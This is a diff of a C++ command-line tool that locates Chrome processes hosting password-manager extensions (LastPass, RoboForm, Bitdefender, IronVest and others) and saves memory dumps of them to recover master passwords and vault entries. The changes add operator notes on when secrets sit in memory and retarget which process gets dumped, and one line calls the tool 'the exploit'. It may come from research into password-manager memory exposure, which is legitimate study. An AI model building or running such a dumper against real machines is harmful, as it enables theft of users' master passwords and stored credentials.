@@ -496,8 +496,10 @@ int main() {
     if (userInput == "lastpass") {
         std::cout << "User input matches 'lastpass'.\n";
         std::cout << "In this browser plugin, the first largest process is needed.\n";
-        std::cout << "All credentials should be available (master pass, entries, etc).\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "All credentials should be available (master username, entries, etc).\n";
+        std::cout << "To find the master password, the user should enter it to log-in and did not terminate the browser\n";
+        std::cout << "In most cases, the user will be already logged-in.\n";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -543,7 +545,7 @@ int main() {
         std::cout << "User input matches 'roboform'.\n";
         std::cout << "In this browser plugin, the first largest process is needed.\n";
         std::cout << "Only entries should be available.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -586,9 +588,9 @@ int main() {
         std::cout << "In Firefox, all credentials should be available (master pass, entries, etc).\n";
         std::cout << "In Chrome, only entries are available.\n";
         std::cout << "Note that in case of Chrome, credentials are removed after some time (i.e., 10 min).\n";
-        std::cout << "To gain again access to entries in Chrome, a browser interaction with the plugin must be made.";
+        std::cout << "To gain again access to entries in Chrome, a browser interaction with the plugin must be made.\n";
         std::cout << "For instance, this can happen when the user visits any login screen.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -632,7 +634,8 @@ int main() {
         std::cout << "In this browser plugin, the first largest process is needed.\n";
         std::cout << "This works by simply having the browser open. No interaction is needed.\n";
         std::cout << "Only entries should be available.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "Wait 30 sec after starting the browser to execute the tool.\n";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -672,11 +675,12 @@ int main() {
     //Did not check with Firefox
     if (userInput == "bitdefender") {
         std::cout << "User input matches 'bitdefender'.\n";
-        std::cout << "In this browser plugin, the second largest process is needed.\n";
+        std::cout << "In this browser plugin, the first largest process is needed to find the master password.\n";
+        std::cout << "The second largest process is needed to find an single entry, but it is not being checked.\n";
         std::cout << "This works when the browser makes an interaction with a login form that has an entry.\n";
         std::cout << "If the tab is closed, nothing will be in the memory.\n";
-        std::cout << "Only the master password remains in this process.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "Only the master password remains in this process for approx. 5 min.\n";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -687,17 +691,17 @@ int main() {
             // Step 2: Get Private Working Set sizes for the found PIDs
             std::vector<std::pair<DWORD, double>> pidSizePairs = GetPrivateWorkingSetSizes(pids);
 
-            // Step 3: Find the PID with the second-largest Private Working Set size
-            DWORD secondLargestPID = FindSecondPID(pidSizePairs);
+            // Step 3: Find the PID with the first-largest Private Working Set size
+            DWORD firstLargestPID = FindFirstPID(pidSizePairs);
 
-            if (secondLargestPID != 0)
+            if (firstLargestPID != 0)
             {
-                // Step 4: Create a dump file for the process with the second-largest size
-                saveDump(secondLargestPID);
+                // Step 4: Create a dump file for the process with the first-largest size
+                saveDump(firstLargestPID);
             }
             else
             {
-                std::cerr << "No process with the second-largest Private Working Set size found." << std::endl;
+                std::cerr << "No process with the first-largest Private Working Set size found." << std::endl;
             }
         }
         else
@@ -719,7 +723,7 @@ int main() {
         std::cout << "In this browser plugin, the fourth largest process is needed.\n";
         std::cout << "This works when the browser has the ironvest webapp open.\n";
         std::cout << "Only entries remains in this process.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
@@ -766,7 +770,7 @@ int main() {
         std::cout << "Only entries remains in this process.\n";
         std::cout << "The exploit was tested with 3 entries. In case the user has more entries, the relevant value (600) should be change in the exploit.\n";
         std::cout << "A hard guess is that approx 200 bytes will be needed per entry.\n";
-        std::cout << "For now, this only works with Chrome.";
+        std::cout << "For now, this only works with Chrome.\n";
         const char* processName = "chrome.exe";
 
         // Step 1: Find PIDs by process name
